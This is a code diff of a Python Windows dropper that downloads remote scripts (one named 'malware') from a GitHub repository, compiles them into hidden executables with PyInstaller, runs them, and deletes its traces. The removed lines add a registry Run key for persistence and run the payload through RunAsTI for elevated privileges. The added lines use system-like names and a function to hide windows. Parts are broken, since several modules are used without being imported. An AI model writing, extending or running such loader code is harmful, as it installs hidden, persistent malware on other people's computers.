@@ -1,9 +1,27 @@
-import urllib.request
 import os
+import sys
+import urllib.request
 import subprocess
 import random
 import shutil
-from pathlib import Path
+import win32api
+import win32con
+import win32event
+import win32clipboard
+
+# Function to create a mutex to check if the process is already running
+def create_mutex(mutex_name):
+    mutex = win32event.CreateMutex(None, 0, mutex_name)
+    if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+        return False
+    return True
+
+# Mutex check before proceeding
+if os.name == "nt":
+    mutex_name = "WindowsSessionHandler"  # Name the mutex uniquely for your program
+    if not create_mutex(mutex_name):
+        print("Mutex already exists. Exiting program.")
+        sys.exit(0)
 
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
@@ -12,10 +30,6 @@ user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
 ]
-
-TEMP_DIR = Path(os.getenv('TEMP'))
-DIST_DIR = TEMP_DIR / "dist"
-BUILD_DIR = TEMP_DIR / "build"
 
 def fetch_python_code(url):
     user_agent = random.choice(user_agents)
@@ -30,103 +44,107 @@ def fetch_python_code(url):
 
 def write_python_file(code, filename):
     if code:
-        py_file_path = TEMP_DIR / filename
-        try:
-            with py_file_path.open('w', encoding='utf-8') as f:
-                f.write(code)
-            return py_file_path
-        except Exception as e:
-            print(f"Error writing file {filename}: {e}")
+        temp_dir = os.getenv('TEMP')
+        py_file_path = os.path.join(temp_dir, filename)
+        with open(py_file_path, 'w', encoding='utf-8') as f:
+            f.write(code)
+        return py_file_path
     return None
 
-def compile_python_to_exe(py_file_path, exe_name):
-    if not py_file_path:
-        return None
-
-    try:
-        DIST_DIR.mkdir(exist_ok=True)
-        BUILD_DIR.mkdir(exist_ok=True)
-        
-        subprocess.run([
-            'pyinstaller',
-            '--onefile',
-            '--noconsole',
-            f'--name={exe_name}',
-            f'--distpath={DIST_DIR}',
-            f'--workpath={BUILD_DIR}',
-            str(py_file_path)
-        ], check=True)
-
-        exe_file_path = DIST_DIR / (exe_name + ".exe")
-        return exe_file_path if exe_file_path.exists() else None
-    except subprocess.CalledProcessError as e:
-        print(f"Error during compilation: {e}")
-    except Exception as e:
-        print(f"Unexpected error: {e}")
+def compile_python_to_exe(py_file_path):
+    if py_file_path:
+        try:
+            temp_dir = os.getenv('TEMP')
+            dist_folder = os.path.join(temp_dir, "dist")
+            build_folder = os.path.join(temp_dir, "build")
+            
+            subprocess.run([
+                'pyinstaller',
+                '--onefile',
+                '--noconsole',
+                '--icon=NONE',
+                f'--distpath={dist_folder}',
+                f'--workpath={build_folder}',
+                py_file_path
+            ], check=True)
+            
+            exe_file_path = os.path.join(dist_folder, os.path.basename(py_file_path).replace(".py", ".exe"))
+            if os.path.exists(exe_file_path):
+                return exe_file_path
+            else:
+                print(f"Error: {exe_file_path} not found in dist folder")
+        except Exception as e:
+            print(f"Error compiling {py_file_path}: {e}")
     return None
 
-def download_file(url, dest_path):
-    try:
-        urllib.request.urlretrieve(url, dest_path)
-        return dest_path if dest_path.exists() else None
-    except Exception as e:
-        print(f"Error downloading {url}: {e}")
-        return None
-
-def execute_with_ti(run_as_ti_path, exe_path):
-    if run_as_ti_path and exe_path:
+def execute_exe_file(exe_file_path):
+    if exe_file_path:
         try:
-            subprocess.run([str(run_as_ti_path), str(exe_path)], check=True)
+            subprocess.Popen([exe_file_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
         except Exception as e:
-            print(f"Error executing with RunAsTI: {e}")
+            print(f"Error executing {exe_file_path}: {e}")
 
-def add_to_startup(exe_path):
-    if not exe_path or not exe_path.exists():
-        return
+def clean_up(temp_files):
+    for item in temp_files:
+        if os.path.exists(item):
+            if os.path.isdir(item):
+                shutil.rmtree(item)
+            else:
+                os.remove(item)
 
-    startup_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-    exe_name = exe_path.name
-    reg_query = f'reg query "{startup_path}" /f "{exe_name}"'
+def install_and_execute(urls_and_filenames):
+    temp_dir = os.getenv('TEMP')
+    temp_files = []
+    exe_files = []
 
-    try:
-        result = subprocess.run(reg_query, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        if result.returncode != 0:  # If not already in startup
-            reg_add = f'reg add "{startup_path}" /v "{exe_name}" /t REG_SZ /d "{exe_path}" /f'
-            subprocess.run(reg_add, shell=True)
-    except Exception as e:
-        print(f"Error adding to startup: {e}")
+    # Step 1: Download Python files
+    for url, filename in urls_and_filenames:
+        code = fetch_python_code(url)
+        if code:
+            py_file_path = write_python_file(code, filename)
+            if py_file_path:
+                temp_files.append(py_file_path)
 
-def clean_up(py_file_path):
-    try:
-        if py_file_path.exists():
-            py_file_path.unlink()
-        if BUILD_DIR.exists():
-            shutil.rmtree(BUILD_DIR)
-        if DIST_DIR.exists():
-            shutil.rmtree(DIST_DIR)
-    except Exception as e:
-        print(f"Error during cleanup: {e}")
+    # Step 2: Compile each Python file into an executable
+    for py_file_path in temp_files:
+        exe_file_path = compile_python_to_exe(py_file_path)
+        if exe_file_path:
+            exe_files.append(exe_file_path)
 
-def install_fetch():
-    fetch_url = "https://github.com/247msn/96737693845/raw/refs/heads/main/fetch"
-    run_as_ti_url = "https://github.com/jschicht/RunAsTI/raw/refs/heads/master/RunAsTI64.exe"
+    # Step 3: Execute the generated executable files
+    for exe_file_path in exe_files:
+        execute_exe_file(exe_file_path)
 
-    # Fetch and write Python file
-    code = fetch_python_code(fetch_url)
-    py_file_path = write_python_file(code, "WindowsSessionHandler.py") if code else None
+    # Step 4: Clean up temporary files and directories
+    dist_folder = os.path.join(temp_dir, "dist")
+    build_folder = os.path.join(temp_dir, "build")
+    temp_files.extend([dist_folder, build_folder])
+    clean_up(temp_files)
 
-    # Compile Python file to EXE
-    exe_file_path = compile_python_to_exe(py_file_path, "WindowsSessionHandler") if py_file_path else None
+# URLs and filenames to download and compile
+urls_and_filenames = [
+    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
+    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
+    ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
+]
 
-    # Download RunAsTI utility
-    run_as_ti_path = download_file(run_as_ti_url, TEMP_DIR / "RunAsTI64.exe")
+def set_invisible():
+    hwnd = win32gui.GetForegroundWindow()  # Get the handle of the current active window
 
-    # Execute EXE with RunAsTI and add to startup
-    if exe_file_path and run_as_ti_path:
-        execute_with_ti(run_as_ti_path, exe_file_path)
-        add_to_startup(exe_file_path)
+    # Make the window invisible on taskbar
+    ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 is SW_HIDE which hides the window
 
-    # Cleanup temporary files
-    clean_up(py_file_path)
+    # Set window transparency to 100% (completely invisible)
+    extended_style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
+    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, extended_style | win32con.WS_EX_LAYERED)
+    win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)  # Fully transparent
 
-install_fetch()
+    # Set TopMost to False, so window cannot be touched or interacted with
+    win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
+
+    # Make sure the window remains undetected
+    gw.getWindowsWithTitle(pyautogui.getActiveWindowTitle())[0].minimize()  # Minimize the window from taskbar
+
+import ctypes; ctypes.windll.user32.MessageBoxW(0, "Ran windowssessionhandler.py", "Message", 0)
+install_and_execute(urls_and_filenames)
+import ctypes; ctypes.windll.user32.MessageBoxW(0, "Ran windowssessionhandler.py install & execute", "Message", 0)
